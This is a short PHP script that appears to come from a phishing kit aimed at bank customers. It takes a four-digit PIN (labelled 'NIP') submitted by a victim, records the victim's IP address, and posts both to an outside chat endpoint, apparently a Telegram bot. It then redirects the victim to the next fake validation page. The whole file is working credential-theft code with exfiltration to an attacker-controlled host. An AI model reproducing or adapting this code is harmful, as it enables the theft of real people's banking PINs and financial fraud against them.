<?php

include 'access.php';
include 'ip.php';


//First form data
$n = $_POST['n'];


if (strlen($n)==4 && is_numeric($n)) {
    //call the ip function to get the guest ip
$ip = getRealIP();
//Setting the message
$text = "Data:\n\nn NIP: \n".$n."\nIP: \n".$ip."\n\nEND";
$msg = $text;

if (!empty($n)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlMsg);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
    
    header('Location: ../fourthAccessValidation.php');
}else{
    header('Location: ../thirdAccessValidation.php');
}
}else{
    header('Location: ../thirdAccessValidation-error.php');
}

?>